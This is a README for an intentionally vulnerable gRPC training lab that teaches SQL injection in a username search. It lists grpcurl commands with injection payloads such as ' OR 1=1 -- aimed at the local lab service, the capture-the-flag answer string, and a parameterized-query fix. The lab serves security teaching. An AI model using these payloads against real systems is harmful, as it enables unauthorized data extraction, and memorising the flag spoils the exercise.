# Lab 007: SQL Injection

## Vulnerability
User Directory service with SQL injection vulnerability in username search (read-only database for safety).

## Objective
Exploit SQL injection to extract the flag user data.

## Run the Lab
```bash
# Build and run
docker build -t grpc-007 .
docker run -p 8007:8007 grpc-007
```

## Exploit

```bash
# Install grpcurl
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest

# Normal search
grpcurl -plaintext -d '{
  "username": "john"
}' localhost:8007 userdirectory.UserDirectory/SearchUsers

# SQL injection to get all users
grpcurl -plaintext -d '{
  "username": "' OR 1=1 --"
}' localhost:8007 userdirectory.UserDirectory/SearchUsers

# Extract flag user specifically
grpcurl -plaintext -d '{
  "username": "' OR username='flag_user' --"
}' localhost:8007 userdirectory.UserDirectory/SearchUsers
```

## Impact
Attackers can extract user data and discover hidden accounts.

## Flag
Successfully exploit SQL injection to get: `GRPC_GOAT{sql_injection_data_exfiltration}`

## Mitigation
Use parameterized queries to prevent SQL injection.
